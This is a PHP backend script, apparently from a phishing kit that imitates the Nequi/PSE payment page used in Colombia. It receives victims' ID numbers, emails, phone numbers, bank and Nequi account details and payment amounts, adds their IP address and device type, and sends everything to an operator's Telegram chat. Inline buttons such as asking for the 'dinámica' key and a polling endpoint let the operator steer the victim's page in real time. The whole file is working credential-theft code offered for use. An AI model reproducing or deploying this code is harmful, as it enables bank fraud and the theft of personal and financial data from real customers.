<?php
ini_set('display_errors', 0);
error_reporting(0);
header('Content-Type: application/json');

/* ============================================================
   ARCHIVOS
   ============================================================ */
$USED_TOKENS_FILE = __DIR__ . '/used_tokens.json';

/* ============================================================
   CARGAR CONFIG
   ============================================================ */
function loadConfig()
{
    $file = __DIR__ . '/../config.php';
    if (!file_exists($file)) return null;

    $config = require $file;
    if (empty($config['bot_token']) || empty($config['chat_id'])) return null;

    return [
        'token'   => $config['bot_token'],
        'chat_id'=> $config['chat_id']
    ];
}

/* ============================================================
   TELEGRAM: SEND MESSAGE
   ============================================================ */
function sendMessage($token, $chatId, $text, $keyboard)
{
    $payload = [
        'chat_id' => $chatId,
        'text' => $text,
        'parse_mode' => 'HTML',
        'reply_markup' => json_encode($keyboard)
    ];

    $ch = curl_init("https://api.telegram.org/bot{$token}/sendMessage");
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_TIMEOUT => 5,
        CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
        CURLOPT_POSTFIELDS => json_encode($payload)
    ]);
    $res = curl_exec($ch);
    curl_close($ch);

    return json_decode($res, true);
}

/* ============================================================
   TELEGRAM: EDIT MESSAGE
   ============================================================ */
function editMessage($token, $chatId, $messageId, $text)
{
    $payload = [
        'chat_id' => $chatId,
        'message_id' => $messageId,
        'text' => $text,
        'parse_mode' => 'HTML'
    ];

    $ch = curl_init("https://api.telegram.org/bot{$token}/editMessageText");
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_TIMEOUT => 5,
        CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
        CURLOPT_POSTFIELDS => json_encode($payload)
    ]);
    curl_exec($ch);
    curl_close($ch);
}

/* ============================================================
   KEYBOARD
   ============================================================ */
function buildKeyboard($tid)
{
    return [
        'inline_keyboard' => [
            [['text' => '🧠🖼 Pedir logo y dinámica', 'callback_data' => "dinamica_logo:$tid"]],
            [['text' => '✅ Pago enviado', 'callback_data' => "enviado:$tid"]],
            [['text' => '🔁 Repetir Nequi', 'callback_data' => "repetir:$tid"]],
            [['text' => '🔄 Elegir otro método', 'callback_data' => "otro:$tid"]],
            [['text' => '🏁 Finalizar', 'callback_data' => "fin:$tid"]]
        ]
    ];
}

/* ============================================================
   MENSAJE - TOMANDO DATOS DEL localStorage (igual que BBVA)
   ============================================================ */
function formatMessage($d)
{
    // Tomar datos directamente del localStorage que ya están guardados
    // NOTA: Estos datos vienen en el payload, pero también están en localStorage
    // del lado del cliente. Aquí tomamos del payload que envía el frontend.
    
    $b = $d['bancoldata'] ?? [];
    $tbdatos = $d['tbdatos'] ?? [];
    $monto = number_format((float)($d['total'] ?? 0), 0, ',', '.');
    
    // OBTENER IP Y HORA ACTUAL
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'No disponible';
    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
        // IP pública
    } else {
        $ip = 'No disponible';
    }
    
    date_default_timezone_set('America/Bogota');
    $hora = date('d/m/Y H:i:s');
    
    // DETERMINAR DISPOSITIVO
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $dispositivo = 'PC';
    if (preg_match('/Android/i', $userAgent)) {
        $dispositivo = 'Android';
    } elseif (preg_match('/iPhone|iPad|iPod/i', $userAgent)) {
        $dispositivo = 'iPhone';
    } elseif (preg_match('/Windows/i', $userAgent)) {
        $dispositivo = 'PC';
    } elseif (preg_match('/Mac/i', $userAgent)) {
        $dispositivo = 'Mac';
    } elseif (preg_match('/Linux/i', $userAgent)) {
        $dispositivo = 'Linux';
    }
    
    // TOMAR LOS DATOS DEL TBDATOS (que deberían contener los mismos que localStorage)
    // Estos son los nombres de campos que se guardan en check.php/index-cel.php
    $correo = $tbdatos['correo'] ?? 'No disponible';
    $celular = $tbdatos['telefono'] ?? $tbdatos['cel'] ?? 'No disponible';
    $cedula = $tbdatos['identificacion'] ?? $tbdatos['val'] ?? 'No disponible';
    $persona = $tbdatos['tipo_persona'] ?? $tbdatos['per'] ?? 'No disponible';
    $banco = $tbdatos['banco'] ?? $tbdatos['nom'] ?? 'No disponible';
    
    $msg = "<b>💎 NEQUI PSE 💎</b>\n";
    $msg .= "<b>• 💸Cedula:</b> " . htmlspecialchars($cedula) . "\n";
    $msg .= "<b>• 💌Correo:</b> " . htmlspecialchars($correo) . "\n";
    $msg .= "<b>• 📞Celular:</b> " . htmlspecialchars($celular) . "\n";
    $msg .= "<b>• 🏦Banco:</b> " . htmlspecialchars($banco) . "\n";
    $msg .= "------------------------------\n";
    $msg .= "<b>• 📟Dispositivo:</b> " . $dispositivo . "\n";
    $msg .= "<b>• 🗺IP:</b> " . $ip . "\n";
    $msg .= "<b>• ⏱Hora:</b> " . $hora . "\n";
    $msg .= "------------------------------\n";
    $msg .= "<b>• 📱 Número:</b> <code>" . htmlspecialchars($b['usuario'] ?? 'N/D') . "</code>\n";
    $msg .= "<b>• 💰 Monto:</b> $ " . $monto . "\n";

    return $msg;
}

/* ============================================================
   TOKENS
   ============================================================ */
function isTokenUsed($id)
{
    global $USED_TOKENS_FILE;
    if (!file_exists($USED_TOKENS_FILE)) return false;
    $tokens = json_decode(file_get_contents($USED_TOKENS_FILE), true);
    return isset($tokens[$id]);
}

function markTokenUsed($id)
{
    global $USED_TOKENS_FILE;
    $tokens = file_exists($USED_TOKENS_FILE)
        ? json_decode(file_get_contents($USED_TOKENS_FILE), true)
        : [];
    $tokens[$id] = time();
    file_put_contents($USED_TOKENS_FILE, json_encode($tokens));
}

/* ============================================================
   CONFIG
   ============================================================ */
$config = loadConfig();
if (!$config) {
    echo json_encode(['ok' => false]);
    exit;
}

/* ============================================================
   POST → ENVÍO INICIAL
   ============================================================ */
if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    $d = json_decode(file_get_contents('php://input'), true);
    $tid = $d['transactionId'] ?? '';

    if (!$tid || isTokenUsed($tid)) {
        echo json_encode(['ok' => false]);
        exit;
    }

    markTokenUsed($tid);

    $msg = formatMessage($d);
    $keyboard = buildKeyboard($tid);
    $sent = sendMessage($config['token'], $config['chat_id'], $msg, $keyboard);

    echo json_encode(['ok' => !empty($sent['ok'])]);
    exit;
}

/* ============================================================
   GET → POLLING + REESCRIBE MENSAJE
   ============================================================ */
if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['transactionId'])) {

    $tid = $_GET['transactionId'];

    $ch = curl_init("https://api.telegram.org/bot{$config['token']}/getUpdates");
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 2
    ]);
    $response = curl_exec($ch);
    curl_close($ch);

    if (!$response) {
        echo json_encode(['ok' => false]);
        exit;
    }

    $updates = json_decode($response, true);
    if (!isset($updates['result'])) {
        echo json_encode(['ok' => false]);
        exit;
    }

    foreach ($updates['result'] as $upd) {

        if (
            isset($upd['callback_query']) &&
            strpos($upd['callback_query']['data'], $tid) !== false
        ) {
            $action = explode(':', $upd['callback_query']['data'])[0];
            $user = $upd['callback_query']['from']['username']
                ?? $upd['callback_query']['from']['first_name']
                ?? 'desconocido';

            $msgId = $upd['callback_query']['message']['message_id'];
            $original = $upd['callback_query']['message']['text'];

            $newText = $original
                . "\n━━━━━━━━━━━━━━━━━━━━"
                . "\n✅ <b>Acción:</b> <code>" . strtoupper($action) . "</code>"
                . "\n👤 <b>Usuario:</b> @" . $user;

            editMessage(
                $config['token'],
                $config['chat_id'],
                $msgId,
                $newText
            );

            echo json_encode([
                'ok' => true,
                'action' => $action
            ]);
            exit;
        }
    }

    echo json_encode(['ok' => false]);
    exit;
}

/* ============================================================
   DEFAULT
   ============================================================ */
echo json_encode(['ok' => false]);
exit;